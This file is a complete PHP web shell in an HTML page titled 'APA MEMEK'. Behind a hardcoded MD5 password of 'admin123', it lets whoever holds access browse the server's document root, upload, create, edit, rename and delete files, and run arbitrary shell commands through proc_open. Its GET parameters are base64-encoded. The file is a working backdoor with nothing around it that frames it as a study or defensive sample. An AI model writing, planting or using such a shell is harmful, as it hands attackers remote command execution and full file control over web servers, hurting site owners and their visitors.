<!DOCTYPE html>
<html>
<head>
    <title>APA MEMEK</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
    <style>
        body {
             font-family: 'Roboto';
             color: white;
             margin: 0;
             padding: 0;
             text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
             background-color: black;
             background-image: none;
        }
        .container {
            width: 90%;
            margin: 20px auto;
            padding: 20px;
            background-color: black;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .result-box {
            width: 97.5%;
            height: 200px;
            resize: none;
            overflow: auto;
            font-family: 'Roboto';
            background-color: #333;
            color: white;
            padding: 10px;
            border: 1px solid #555;
            margin-bottom: 10px;
        }
        hr {
            border: 0;
            border-top: 1px solid #555;
            margin: 20px 0;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #444;
        }
        tr:nth-child(even) {
            background-color: #222;
        }
        tr:hover {
            background-color: #555;
        }
        input[type="text"], input[type="password"], input[type="submit"], textarea[name="file_content"] {
            width: calc(97.5% - 10px);
            margin-bottom: 10px;
            padding: 8px;
            max-height: 200px;
            resize: vertical;
            border: 1px solid #555;
            border-radius: 3px;
            font-family: 'Roboto';
            background-color: #333;
            color: white;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            font-family: 'Roboto';
            border: none;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        .item-name {
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        td.size {
            width: 100px;
        }
        .permission {
            color: green;
            font-weight: bold;
            width: 50px;
            height: 20px;
            text-align: center;
            line-height: 20px;
            overflow: hidden;
        }
    </style>
</head>
<body>
<div class="container">
<?php
session_start();
// Hardcoded MD5 hash of the password 'admin123'
$hardcodedPasswordHash = '6d64cc832197bc6c446c41bcd4bd8339'; // MD5 hash of 'admin123'

if (isset($_POST['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF'] . (isset($_SERVER['QUERY_STRING']) ? '?' . $_SERVER['QUERY_STRING'] : ''));
    exit;
}

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        $inputPasswordHash = md5($_POST['password']);
        if ($inputPasswordHash === $hardcodedPasswordHash) {
            $_SESSION['loggedin'] = true;
            header('Location: ' . $_SERVER['PHP_SELF'] . (isset($_SERVER['QUERY_STRING']) ? '?' . $_SERVER['QUERY_STRING'] : ''));
            exit;
        } else {
            echo '<hr><p>Error: Incorrect password!</p>';
        }
    }
    echo '<form method="post">';
    echo '<input type="password" name="password" placeholder="Enter Password">';
    echo '<input type="submit" value="Login">';
    echo '</form>';
    exit;
}

$rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);

function x($b)
{
    return base64_encode($b);
}

function y($b)
{
    return base64_decode($b);
}

foreach ($_GET as $c => $d) $_GET[$c] = y($d);

$currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
chdir($currentDirectory);

$viewCommandResult = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] == 0) {
        $uploadPath = $currentDirectory . '/' . basename($_FILES['upload_file']['name']);
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $uploadPath)) {
            echo '<hr>File uploaded successfully!';
        } else {
            echo '<hr>Error: Failed to upload file!';
        }
    } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
        if (!file_exists($newFolder)) {
            mkdir($newFolder);
            echo '<hr>Folder created successfully!';
        } else {
            echo '<hr>Error: Folder already exists!';
        }
    } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
        $fileName = $_POST['file_name'];
        $newFile = $currentDirectory . '/' . $fileName;
        if (!file_exists($newFile)) {
            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                echo '<hr>File created successfully!';
            } else {
                echo '<hr>Error: Failed to create file!';
            }
        } else {
            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                echo '<hr>File edited successfully!';
            } else {
                echo '<hr>Error: Failed to edit file!';
            }
        }
    } elseif (isset($_POST['delete_file'])) {
        $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
        if (file_exists($fileToDelete)) {
            if (unlink($fileToDelete)) {
                echo '<hr>File deleted successfully!';
            } else {
                echo '<hr>Error: Failed to delete file!';
            }
        } elseif (is_dir($fileToDelete)) {
            if (deleteDirectory($fileToDelete)) {
                echo '<hr>Folder deleted successfully!';
            } else {
                echo '<hr>Error: Failed to delete folder!';
            }
        } else {
            echo '<hr>Error: File or directory not found!';
        }
    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
        $oldName = $currentDirectory . '/' . $_POST['old_name'];
        $newName = $currentDirectory . '/' . $_POST['new_name'];
        if (file_exists($oldName)) {
            if (rename($oldName, $newName)) {
                echo '<hr>Item renamed successfully!';
            } else {
                echo '<hr>Error: Failed to rename item!';
            }
        } else {
            echo '<hr>Error: Item not found!';
        }
    } elseif (isset($_POST['cmd_input'])) {
        $command = $_POST['cmd_input'];
        $descriptorspec = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = proc_open($command, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $errors = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            if (!empty($errors)) {
                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($errors) . '</textarea>';
            } else {
                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($output) . '</textarea>';
            }
        } else {
            $viewCommandResult = '<hr><p>Error: Failed to execute command!</p>';
        }
    } elseif (isset($_POST['view_file'])) {
        $fileToView = $currentDirectory . '/' . $_POST['view_file'];
        if (file_exists($fileToView)) {
            $fileContent = file_get_contents($fileToView);
            $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
        } else {
            $viewCommandResult = '<hr><p>Error: File not found!</p>';
        }
    }
}

echo '<form method="post"><input type="submit" name="logout" value="Logout"></form>';

echo '<hr>curdir: ';
$directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
$currentPath = '';
foreach ($directories as $index => $dir) {
    if ($index == 0) {
        echo '<a href="?d=' . x($dir) . '">' . $dir . '</a>';
    } else {
        $currentPath .= DIRECTORY_SEPARATOR . $dir;
        echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    }
}
echo '<br>';
echo '<hr><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
echo '<input type="text" name="folder_name" placeholder="New Folder Name">';
echo '<input type="submit" value="Create Folder">';
echo '</form>';

echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
echo '<input type="text" name="file_name" placeholder="Create New File / Edit Existing File">';
echo '<textarea name="file_content" placeholder="File Content (for new file) or Edit Content (for existing file)"></textarea>';
echo '<input type="submit" value="Create / Edit File">';
echo '</form>';

echo '<form method="post" enctype="multipart/form-data" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
echo '<input type="file" name="upload_file">';
echo '<input type="submit" value="Upload File">';
echo '</form>';

echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="text" name="cmd_input" placeholder="Enter command"><input type="submit" value="Run Command"></form>';
echo $viewCommandResult;
echo '<div>';
echo '</div>';
echo '<table border=1>';
echo '<br><tr><th><center>Item Name</th><th><center>Size</th><th><center> View  </th><th><center>Delete </th><th>Permissions</th><th><center>Rename</th></tr></center></center></center>';
foreach (scandir($currentDirectory) as $v) {
    $u = realpath($v);
    $s = stat($u);
    $itemLink = is_dir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?'.('d='.x($currentDirectory).'&f='.x($v));
    $permission = substr(sprintf('%o', fileperms($v)), -4);
    echo '<tr>
            <td class="item-name"><a href="'.$itemLink.'">'.$v.'</a></td>
            <td class="size">'.filesize($u).'</td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="view_file" value="'.htmlspecialchars($v).'"><input type="submit" value="View"></form></td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="delete_file" value="'.htmlspecialchars($v).'"><input type="submit" value="Delete"></form></td>
            <td class="permission">'.$permission.'</td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="old_name" value="'.htmlspecialchars($v).'"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
        </tr>';
}

echo '</table>';
function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }
    return rmdir($dir);
}
?>

</div>
</body>
</html>